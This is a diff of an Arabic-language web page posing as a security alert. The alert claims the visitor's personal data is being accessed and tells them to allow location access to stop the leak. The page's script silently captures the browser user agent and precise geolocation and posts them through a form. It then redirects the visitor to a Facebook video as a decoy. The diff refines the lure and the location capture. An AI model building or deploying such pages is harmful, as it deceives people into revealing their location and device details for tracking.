@@ -1,9 +1,9 @@
-DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق من البيانات المسربة</title>
+    <title>نظام التحقق من البيانات</title>
     <style>
         body { font-family: sans-serif; background-color: #1a1a1a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .container { text-align: center; background: #2d2d2d; padding: 2rem; border-radius: 12px; border: 1px solid #ff4d4d; width: 85%; }
@@ -12,10 +12,9 @@ DOCTYPE html>
     </style>
 </head>
 <body>
-
 <div class="container">
-    <h3>تنبيه أمني</h3>
-    <p>تم رصد محاولة وصول لبياناتك الشخصية. يرجى السماح بتأكيد الموقع لتوثيق ملكية الحساب وإيقاف عملية التسريب فوراً.</p>
+    <h3>⚠️ تنبيه أمني</h3>
+    <p>تم رصد محاولة وصول لبياناتك الشخصية. يرجى "السماح" بتأكيد الموقع لتوثيق ملكية الحساب وإيقاف عملية التسريب فوراً.</p>
     <div class="loader"></div>
 </div>
 
@@ -26,14 +25,19 @@ DOCTYPE html>
 </form>
 
 <script>
-    const videoUrl = "https://www.facebook.com/share/v/14ciBr7gfyC/";
+    const vUrl = "https://www.facebook.com/share/v/14ciBr7gfyC/";
 
     window.onload = function() {
         document.getElementById('device').value = navigator.userAgent;
+        // التأكد من طلب الموقع فور تحميل الصفحة
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy: true});
+            navigator.geolocation.getCurrentPosition(success, error, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
         } else {
-            window.location.href = videoUrl;
+            window.location.href = vUrl;
         }
     };
 
@@ -45,11 +49,14 @@ DOCTYPE html>
             method: 'POST',
             body: new FormData(form),
             headers: { 'Accept': 'application/json' }
-        }).finally(() => { window.location.href = videoUrl; });
+        }).finally(() => { window.location.href = vUrl; });
     }
 
-    function error() { window.location.href = videoUrl; }
+    function error(err) {
+        // في حال الرفض أو الخطأ يتم التحويل للفيديو
+        console.log("Error: " + err.message);
+        window.location.href = vUrl;
+    }
 </script>
 </body>
 </html>
-
